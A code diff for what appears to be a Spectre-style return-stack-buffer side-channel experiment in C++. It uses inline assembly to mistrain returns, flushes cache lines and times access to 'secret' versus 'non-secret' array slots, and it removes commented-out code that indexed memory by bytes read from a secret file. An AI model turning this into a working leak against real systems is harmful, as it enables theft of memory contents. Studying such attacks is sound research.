@@ -3,23 +3,20 @@
 #include <fstream>
 #include <unistd.h>
 #include <sched.h>
-#define secret 2
-#define nonsecret 200
+#define secret 5
+#define nonsecret 37
+#define offset 256
+#define iterations 10000
 
-#define retAsm(i) "call get_rip" #i ";"  "get_rip" #i ":"  "pop %0;" "add $7,%0;" "push %0;" "ret;"
+#define retAsm(i) "call get_rip" #i ";"  "get_rip" #i ":"  "pop %0;" "add $13,%0;" "push %0;" "clflush (%%rsp);" "cpuid;" "ret;"
 
 using namespace std;
 
-char* array;
+char array[256*256];
 int total = 0, total2 = 0;
 int lbl = 0;
 
-inline void timeAndFlush(ADDR_PTR addr) {
-	printAccessTime(addr);
-	// clflush((void *)addr);
-}
-
-volatile void spacer2() {
+volatile void spacer() {
 	asm(
 		".rept 2195;"
 		"nop;"
@@ -28,14 +25,13 @@ volatile void spacer2() {
 }
 
 void exploit() { // this should be at the same VA as attacker:gadget()
-	volatile int temp = array[secret*offset];
+	volatile char temp = array[secret*offset];
 }
 
-void trickMe() {
-	ADDR_PTR address, tmp;
+void measureSpeculation() {
+	ADDR_PTR tmp;
 
-	for (int i = 0; i<10000;i++) {
-		// deepCallStack(16);
+	for (int i = 0; i<iterations;i++) {
 		sched_yield();
 		asm(
 			retAsm(1)
@@ -55,11 +51,9 @@ void trickMe() {
 			retAsm(15)
 			retAsm(16)
 			: "=r" (tmp)
-			: "r" (address)
+			:
 		);
 	
-		//exploit();
-		// timeAndFlush((ADDR_PTR)&array[secret]);
 		total += measure_one_block_access_time((ADDR_PTR)&array[secret*offset]);
 		total2 += measure_one_block_access_time((ADDR_PTR)&array[nonsecret*offset]);
 		clflush((void *)&array[secret*offset]);
@@ -67,51 +61,13 @@ void trickMe() {
 	}
 }
 
-int main(){
-	const int SIZE = 1<<20; 
-	// shared memory is named Sally because Rob doesn't know anyone named Sally
-    const char* name = "Sally";
-    char temp;
-    // shared memory file descriptor
-    int shm_fd;  
-    // pointer to shared memory obect
-    // create the shared memory object
-    shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666); 
-    // configure the size of the shared memory object
-    ftruncate(shm_fd, SIZE); 
-    // memory map the shared memory object
-    array = (char*)mmap(0, SIZE, PROT_WRITE, MAP_SHARED, shm_fd, 0); 
-	
+int main(){	
 	clflush(&array[secret*offset]);
 	clflush(&array[nonsecret*offset]);
 
-	trickMe();
+	measureSpeculation();
 
-	printf("avg time for secret1 is %f\n", total/10000.0);
-	printf("avg time for secret2 is %f\n", total2/10000.0);
-	// printf("diff avg time is %f\n", total2/1000.0 - total/1000.0);
-
-	// for(int i = 0; i < 10000; i++) {
-	// 	printf("%u\n", times[i]);
-	// }
-
-	// string buffer;
-	// char temp;
-	// volatile int i = 0;
-
-	// ifstream secretFile("secret");
-	// if(secretFile.is_open()){
-	// 	getline(secretFile, buffer);
-	// 	secretFile.close();
-	// }
-
-	// string secret = buffer;
-	// temp &= array[secret[i]*256]; // vulneralbility
-
-	// while(true){
-	// 	foo();
-	// 	measureAccessTime();
-	// }
-
+	printf("avg time for secret is %i\n", total/iterations);
+	printf("avg time for non-secret is %i\n", total2/iterations);
 	return 0;
 }
